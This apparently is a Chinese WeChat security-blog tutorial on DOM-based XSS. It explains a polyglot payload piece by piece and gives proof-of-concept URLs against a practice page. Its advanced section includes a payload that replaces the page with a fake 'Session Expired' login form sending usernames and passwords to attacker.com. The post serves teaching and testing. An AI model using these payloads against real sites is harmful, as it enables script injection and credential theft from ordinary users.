---
title: 基于 DOM 的 XSS 攻击
url: https://mp.weixin.qq.com/s/2Qi5MXCgZNS7Q82ep9hXJw
source: Doonsec's feed
date: 2026-04-01
fetch_date: 2026-04-02T04:27:20.729934
---

# 基于 DOM 的 XSS 攻击

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/9mJNQIzib3Q2ujwk9hu8dL8Yl6kKqKKBRExeyyzIaTnOl85F2ibicmhefTdAXHrBiadHnu5msCrEWuVibzOjdMQR8z6dJzNGYYmsyDZOM69CxAY8/0?wx_fmt=jpeg)

# 基于 DOM 的 XSS 攻击

原创

JunYi
JunYi

毅心安全

![]()

在小说阅读器中沉浸阅读

# 基于 DOM 的 XSS 攻击

### payload

```
1;/*'"><Img/Src/OnError=/**/confirm(1)//>
```

### 解析

```
1;：如果输入点在 JS 环境（如 eval()），这代表一个完整的语句结束。

/*：JS 的多行注释符。它会让 JS 引擎忽略后面用来突破 HTML 环境的字符（如 '"><），防止 JS 报错中断执行。

'"：尝试闭合可能存在的单引号或双引号字符串。

>：尝试闭合当前的 HTML 标签。

<Img/Src/OnError=...：这是核心攻击载荷。当之前的标签被闭合后，浏览器会解析这个新标签。由于 Src 为空或无效，会触发 OnError 事件。

/**/：在 OnError 内部使用注释代替空格，用来绕过某些对空格的过滤。

//：JS 的单行注释符。如果是在 JS 环境中，它会注释掉后面可能存在的任何原始代码（如 )!），确保语法正确。
```

当输入内容最终通过以下方式进入 DOM 时，可以使用以下方法：
A. document.write()、innerHTML、outerHTML 或等效的库；
B. eval()、setInterval()、setTimeout() 或模板字面量。

PoCs:
A:

```
https://x55.is/brutelogic/dom/sinks.html?name=1;/*%27%22%3E%3CImg/Src/OnError=/**/confirm(1)//%3E
```

B:

```
https://x55.is/brutelogic/dom/sinks.html?index=1;/*%27%22%3E%3CImg/Src/OnError=/**/confirm(1)//%3E
```

### 实战

#### A:

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9mJNQIzib3Q1H7rs2JxrAxka1rKouI4SBBw7Ric4ol273bbuhEjJTcEQnOU7XdtmYBz0NlAHhW6gpfIxQDBIjawdpicEdALRE9DG9xHSHwUCvI/640?from=appmsg "null")

### 进阶

尝试重写页面 ......
poc:

```
document.body.innerHTML = '<h1>Session Expired</h1><form action="http://attacker.com/login"><p>Username: <input name="u"></p><p>Password: <input type="password" name="p"></p><button>Login</button></form>';
```

效果：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9mJNQIzib3Q26CQ34UiaoFtJ7FEoTbibuO96YrwFDlX9Z1GdBfq3y0m37kicKNiaPlFe3Dye86g3un8sSXLUaYmpm4eVUnziavr2lTQogqgWTKDgM/640?from=appmsg "null")

#### B:

![](https://mmbiz.qpic.cn/mmbiz_png/9mJNQIzib3Q1AyIPD0dwmQva86xPGbF9KEwu88ypib36ylQkdozm5Blrv5m614fiabDkCYftGGokibuJB9BYfgrlOanL8LNPnDkm6icoERFFWMnA/640?from=appmsg "null")

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/kzkqdAEDfXdKQzSjUmtSu9wlia18CPwm2k8nmiapVP04SYnXtghKHZquWfRclUc501UHoS9nOrAnBSuhKc1Y2nfw/0?wx_fmt=png)

毅心安全

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/kzkqdAEDfXdKQzSjUmtSu9wlia18CPwm2k8nmiapVP04SYnXtghKHZquWfRclUc501UHoS9nOrAnBSuhKc1Y2nfw/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过